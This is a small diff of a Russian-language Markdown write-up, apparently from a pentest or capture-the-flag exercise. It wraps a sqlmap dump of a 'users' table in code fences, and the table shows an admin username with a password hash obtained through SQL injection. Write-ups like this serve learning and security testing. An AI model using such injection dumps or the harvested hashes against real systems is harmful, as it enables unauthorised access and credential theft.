@@ -63,11 +63,11 @@ do you want sqlmap to try to optimize value(s) for DBMS delay responses (option 
 ```
 
 смотрим что в users - 
-
+```
 +----------+----------------------------------+
 | username | password                         |
 +----------+----------------------------------+
 | admin    | 5765dcb76627ba4e2fd673e073def4ae |
 +----------+----------------------------------+
-
+```
 
